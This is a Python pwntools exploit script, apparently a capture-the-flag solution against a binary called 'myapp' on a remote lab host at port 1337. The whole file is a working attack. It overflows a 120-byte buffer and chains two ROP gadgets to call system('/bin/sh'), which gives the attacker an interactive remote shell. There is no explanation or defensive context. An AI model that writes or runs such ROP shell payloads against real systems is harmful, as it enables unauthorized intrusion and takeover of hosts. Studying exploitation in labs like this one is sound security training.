from pwn import *
import struct
import sys
import re

BINARY = './myapp'
BUFFER_LEN = 120

# io = process(BINARY)
io = remote("10.10.10.147", 1337)
# io = gdb.debug('./myapp', 'b *main+77') # ret of main()

# Gadgets
pop_r13 = p64(0x401206)  # pop r13 ; pop r14 ; pop r15 ; ret
mov_rdi = p64(0x401156)  # mov rdi, rsp

# Addresses
system  = p64(0x40116e)
main    = p64(0x40115f)  # debug

# Data
bin_sh  = b"/bin/sh\x00"

payload =  b""
payload += b"A" * BUFFER_LEN

# pop r13 ; pop r14 ; pop r15 ; ret
payload += pop_r13
payload += system       # r13
payload += b"BBBBBBBB"  # r14
payload += b"BBBBBBBB"  # r15

# mov rdi, rsp
payload += mov_rdi
payload += bin_sh       # /bin/sh\x00

io.sendline(payload)
io.interactive()